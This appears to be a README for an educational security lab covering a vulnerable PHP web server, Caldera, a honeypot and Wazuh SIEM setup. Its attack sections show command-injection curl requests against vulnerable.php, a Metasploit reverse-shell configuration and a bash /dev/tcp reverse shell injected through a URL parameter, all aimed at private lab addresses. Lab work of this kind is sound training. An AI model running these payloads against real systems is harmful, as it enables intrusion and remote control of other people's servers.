# Information Security Project Implementation
## Offensive Security, Cyber Deception, and SIEM

This project implements a comprehensive security testing environment including service exploitation, honeypot deployment, and SIEM integration.

## Table of Contents
- [Phase 1: Setup and Service Compromise](#phase-1-setup-and-service-compromise)
- [Phase 2: Honeypot Setup](#phase-2-honeypot-setup)
- [Phase 3: SIEM Integration](#phase-3-siem-integration)

## Phase 1: Setup and Service Compromise

### Victim Environment Setup

#### Apache Installation
```bash
# Update system
sudo apt update

# Install Apache
sudo apt install --fix-missing apache2

# Start and verify Apache service
sudo service apache2 start
sudo service apache2 status
```

#### Custom Webpage Setup
```bash
# Navigate to web root
cd /var/www/html

# Remove default files
sudo rm -rf *

# Create new index file
sudo nano index.html
```

#### PHP Installation
```bash
# Install PHP and Apache PHP module
sudo apt update
sudo apt install php libapache2-mod-php

# Enable PHP module and restart Apache
sudo a2enmod php8.2
sudo systemctl restart apache2

# Create test PHP files
sudo nano /var/www/html/test.php
sudo nano /var/www/html/phpinfo.php
sudo nano /var/www/html/vulnerable.php
```

### Attacker Environment Setup (Caldera)

#### Prerequisites Installation
```bash
# Install Git and Node.js
sudo apt install git -y
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Install Go
wget https://go.dev/dl/go1.19.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.19.13.linux-amd64.tar.gz
echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile

# Install Python requirements
sudo apt install python3 python3-pip -y
```

#### Caldera Setup
```bash
# Clone repository
git clone https://github.com/mitre/caldera.git --recursive

# Setup virtual environment
cd caldera
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Start Caldera
python3 server.py --insecure --build
```

### Attack Commands

#### Basic Command Injection Testing
```bash
# List directory contents
curl "http://10.0.2.15/vulnerable.php?cmd=ls"

# Get system information
curl "http://10.0.2.15/vulnerable.php?cmd=uname%20-a"

# Detailed directory listing
curl "http://10.0.2.15/vulnerable.php?cmd=ls%20-la%20/var/www/html"
```

#### Metasploit Reverse Shell
```bash
# Launch Metasploit console
msfconsole

# Configure and launch exploit
use exploit/multi/script/web_delivery
set target 1
set payload linux/x64/shell_reverse_tcp
set lhost 10.0.2.4
set lport 4444
exploit
```

## Phase 2: Honeypot Setup

### Testing Commands
```bash
# Test directory listing
curl "http://10.0.2.15:8000/vulnerable.php?cmd=ls"

# Test reverse shell
curl "http://127.0.0.1:8000/vulnerable.php?cmd=bash -c 'bash -i > /dev/tcp/10.0.2.15/4444 0>&1'"
```

## Phase 3: SIEM Integration

### Wazuh Manager Installation
```bash
# Add Wazuh repository
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
sudo sh -c 'echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list'

# Install manager
sudo apt update
sudo apt install wazuh-manager

# Start and enable service
sudo systemctl start wazuh-manager
sudo systemctl enable wazuh-manager
```

### Wazuh Agent Installation
```bash
# Add Wazuh GPG key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --dearmor -o /usr/share/keyrings/wazuh.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list

# Install agent
sudo apt update
sudo apt install wazuh-agent -y

# Verify services
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-agent
```

## Network Configuration

### Environment Details
- Victim Machine (Apache Server):
  - OS: Kali Linux (VirtualBox)
  - IP: 10.0.2.15
- Attacker Machine:
  - OS: Kali Linux (VirtualBox)
  - IP: 10.0.2.4

## Note
This project is for educational purposes only. The vulnerable environment should only be deployed in a controlled, isolated lab setting.
